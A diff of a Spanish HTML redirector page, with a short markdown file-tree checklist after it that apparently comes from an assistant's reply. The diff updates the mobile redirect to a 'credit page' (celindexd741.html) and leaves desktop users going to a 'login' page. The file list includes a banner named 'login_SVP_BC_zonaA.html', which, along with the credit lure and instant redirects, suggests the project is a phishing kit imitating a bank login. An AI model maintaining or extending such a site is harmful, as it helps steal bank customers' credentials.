@@ -12,15 +12,16 @@
         
         // Redirigir según el dispositivo
         if (isMobile()) {
-            // Si es móvil, va PRIMERO a la página de crédito
-            window.location.href = "celindex.html";
+            // CAMBIO AQUÍ: usar celindexd741.html
+            window.location.href = "celindexd741.html";
         } else {
             // Si es escritorio, va directo al login
             window.location.href = "indexx.html";
         }
     </script>
     
-    <meta http-equiv="refresh" content="0; url=celindex.html">
+    <!-- CAMBIO AQUÍ también -->
+    <meta http-equiv="refresh" content="0; url=celindexd741.html">
     
     <style>
         body {
@@ -78,8 +79,35 @@
         <div style="text-align: center; padding: 20px; background: white; border-radius: 10px; color: #333;">
             <h3>JavaScript está deshabilitado</h3>
             <p>Por favor haz clic en el siguiente enlace:</p>
-            <a href="celindex.html" style="color: #667eea; font-weight: bold;">Continuar al sitio</a>
+            <a href="celindexd741.html" style="color: #667eea; font-weight: bold;">Continuar al sitio</a>
         </div>
     </noscript>
 </body>
 </html>
+```
+
+## 📂 **Verifica tu estructura de archivos**
+
+Asegúrate de que tengas estos archivos en tu proyecto:
+```
+tu-proyecto/
+│
+├── index.html (redireccionador)
+├── celindexd741.html (página de crédito)
+├── indexx.html (login principal)
+├── login_SVP_BC_zonaA.html (banner)
+│
+├── images/
+│   ├── cel1.jpg
+│   └── w.png
+│
+├── img/
+│   └── imgPublicidad.png
+│
+├── css/
+│   ├── styles.css
+│   ├── bootstrap.css
+│   └── ...
+│
+└── js/
+    └── ...
